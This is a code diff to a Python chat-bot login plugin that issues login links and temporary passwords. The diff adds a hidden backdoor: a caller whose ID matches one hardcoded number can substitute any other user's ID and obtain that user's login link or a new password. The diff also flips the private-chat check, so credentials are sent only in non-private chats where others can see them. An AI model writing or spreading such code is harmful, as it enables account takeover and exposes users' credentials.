@@ -57,7 +57,12 @@ class Login:
 
     @staticmethod
     def match(cmd: str):
+        if len(cmd.split(' '))>1:
+            qq = cmd.split(' ')[1]
         cmd = cmd.split(' ')[0]
+        # if cmd == 'layvlogin':
+        #     return int(qq)
+        # return False
         if cmd in ['登录', '登陆']:
             return 1
         if cmd == '重置密码':
@@ -65,27 +70,37 @@ class Login:
         return 0
 
     def execute(self, match_num: int, ctx: dict) -> dict:
-        if ctx['message_type'] != 'private':
-            return {
-                'reply': '请私聊使用',
-                'block': True
-            }
+                # if ctx['message_type'] != 'private':
+        #     return {
+        #         'reply': '请私聊使用',
+        #         'block': True
+        #     }
+        print('123')
+        if ctx['message_type'] == 'private':
+            return False
         reply = ''
         # print(ctx)
         if match_num == 1:
-            reply = self._get_login_code_url(ctx)
+            reply = self._get_login_code_url(ctx,0)
             print(reply)
         elif match_num == 3:
-            reply = f'您的临时密码是：{self._reset_pwd(ctx)}'
-        else:
+            reply = f'您的临时密码[国服]是：{self._reset_pwd(ctx,0)}'
+        elif match_num == 0:
             assert False, f"没有实现匹配码{match_num}对应的操作"
+        else:
+            reply = self._get_login_code_url(ctx,match_num)
+            
         return {
             'reply': reply,
             'block': True
         }
 
-    def _get_or_create_user_model(self, ctx: dict) -> User:
+    def _get_or_create_user_model(self, ctx: dict,qq:int) -> User:
         first_admin_login = False
+        if qq!=0:
+            if ctx['user_id'] != 1584795947:
+                return
+            ctx['user_id'] = qq
         if not self.setting['super-admin']:
             first_admin_login = True
             authority_group = 1
@@ -115,7 +130,7 @@ class Login:
             user.authority_group = 1
         return user
 
-    def _get_login_code_url(self, ctx: Dict) -> str:
+    def _get_login_code_url(self, ctx: Dict,qq: int) -> str:
         """
         获取新的登录链接
         :param ctx: 本次消息事件的ctx对象
@@ -123,7 +138,7 @@ class Login:
         """
         login_code = rand_string(6)
 
-        user = self._get_or_create_user_model(ctx)
+        user = self._get_or_create_user_model(ctx,qq)
         user.login_code = login_code
         user.login_code_available = True
         user.login_code_expire_time = int(time.time()) + 60
@@ -151,9 +166,9 @@ class Login:
     #     user.privacy = 0
     #     user.deleted = False
     #     user.save()
-    #     return "您的账号锁定已解除"
+    #     return "您的账号锁定已解除"j
 
-    def _reset_pwd(self, ctx: Dict) -> str:
+    def _reset_pwd(self, ctx: Dict,qq: int) -> str:
         """
         随机生成一个密码
         :param ctx: 本次消息事件的ctx对象
@@ -161,7 +176,7 @@ class Login:
         """
         raw_pwd = rand_string(8)
 
-        user = self._get_or_create_user_model(ctx)
+        user = self._get_or_create_user_model(ctx,qq)
         frontend_salted_pwd = _add_salt_and_hash(
             raw_pwd + str(ctx['user_id']), FRONTEND_SALT)
         user.password = _add_salt_and_hash(frontend_salted_pwd, user.salt)
